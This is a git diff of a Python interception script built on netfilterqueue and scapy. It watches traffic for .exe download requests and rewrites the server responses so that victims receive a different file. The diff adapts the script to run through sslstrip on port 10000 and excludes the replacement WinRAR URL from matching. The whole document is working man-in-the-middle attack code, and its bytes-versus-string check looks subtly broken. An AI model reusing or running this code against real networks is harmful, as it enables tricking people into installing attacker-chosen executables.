@@ -1,7 +1,6 @@
 import netfilterqueue as nfq
 from termcolor import colored
 from os import getuid
-from subprocess import call
 import scapy.all as scapy
 
 ack_list = []
@@ -11,11 +10,12 @@ def process_packet(packet):
     scapy_packet = scapy.IP(packet.get_payload())
     if scapy_packet.haslayer(scapy.Raw):
 
-        if scapy_packet[scapy.TCP].dport == 80:
-            if b".exe" in scapy_packet[scapy.Raw].load:
+        if scapy_packet[scapy.TCP].dport == 10000:  # sslstrip
+            # the exe file is no the replacing file
+            if b".exe" in scapy_packet[scapy.Raw].load and "https://d.winrar.es" not in scapy_packet[scapy.Raw].load:
                 print(f"{colored('[!]', 'green')} Exe found")
                 ack_list.append(scapy_packet[scapy.TCP].ack)
-        elif scapy_packet[scapy.TCP].sport == 80:
+        elif scapy_packet[scapy.TCP].sport == 10000:  # sslstrip
             if scapy_packet[scapy.TCP].seq in ack_list:
                 ack_list.remove(scapy_packet[scapy.TCP].seq)
                 print(f"{colored('[!]', 'green')} Response found")
@@ -23,7 +23,7 @@ def process_packet(packet):
                 del scapy_packet[scapy.IP].len
                 del scapy_packet[scapy.IP].chksum
                 del scapy_packet[scapy.TCP].len
-               
+
                 packet.set_payload(bytes(scapy_packet))
 
     packet.accept()
